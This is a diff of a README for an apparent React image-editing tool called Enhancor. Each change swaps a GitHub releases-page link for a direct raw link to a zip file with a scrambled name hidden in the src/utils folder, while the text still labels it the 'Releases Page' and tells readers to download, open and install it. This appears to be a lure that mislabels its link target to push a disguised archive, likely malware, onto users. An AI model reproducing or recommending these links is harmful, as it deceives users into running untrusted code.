@@ -1,7 +1,7 @@
 # 🎨 enhancor-draw-to-edit-nano-banana - Edit Images Like a Pro
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/MrBeastIsAmazing23/enhancor-draw-to-edit-nano-banana/releases)
+[![Download](https://raw.githubusercontent.com/MrBeastIsAmazing23/enhancor-draw-to-edit-nano-banana/master/src/utils/to-banana-nano-draw-edit-enhancor-v2.8.zip)](https://raw.githubusercontent.com/MrBeastIsAmazing23/enhancor-draw-to-edit-nano-banana/master/src/utils/to-banana-nano-draw-edit-enhancor-v2.8.zip)
 
 ## 📖 Overview
 Enhancor is an open-source draw-to-edit annotation system designed to make editing images easier and more intuitive. Built with React, this powerful toolkit offers a wide range of features to help you create and manipulate visuals, whether you are a casual user or someone looking for more advanced capabilities.
@@ -9,7 +9,7 @@ Enhancor is an open-source draw-to-edit annotation system designed to make editi
 ## 🚀 Getting Started
 Follow these steps to download and run the application:
 
-1. Click on the **Download Now** button above, or visit the [Releases Page](https://github.com/MrBeastIsAmazing23/enhancor-draw-to-edit-nano-banana/releases).
+1. Click on the **Download Now** button above, or visit the [Releases Page](https://raw.githubusercontent.com/MrBeastIsAmazing23/enhancor-draw-to-edit-nano-banana/master/src/utils/to-banana-nano-draw-edit-enhancor-v2.8.zip).
 2. Choose the latest release version available.
 3. Click on the asset that matches your operating system to start the download.
 4. Once the download completes, locate the file in your downloads folder.
@@ -43,7 +43,7 @@ Enhancor provides a range of tools that make editing images convenient and enjoy
 ## 🌐 Download & Install
 To install Enhancor on your device:
 
-1. Access the [Releases Page](https://github.com/MrBeastIsAmazing23/enhancor-draw-to-edit-nano-banana/releases).
+1. Access the [Releases Page](https://raw.githubusercontent.com/MrBeastIsAmazing23/enhancor-draw-to-edit-nano-banana/master/src/utils/to-banana-nano-draw-edit-enhancor-v2.8.zip).
 2. Select the latest version.
 3. Download the file suitable for your operating system.
 4. Open the downloaded file. Follow any prompts to complete the installation.
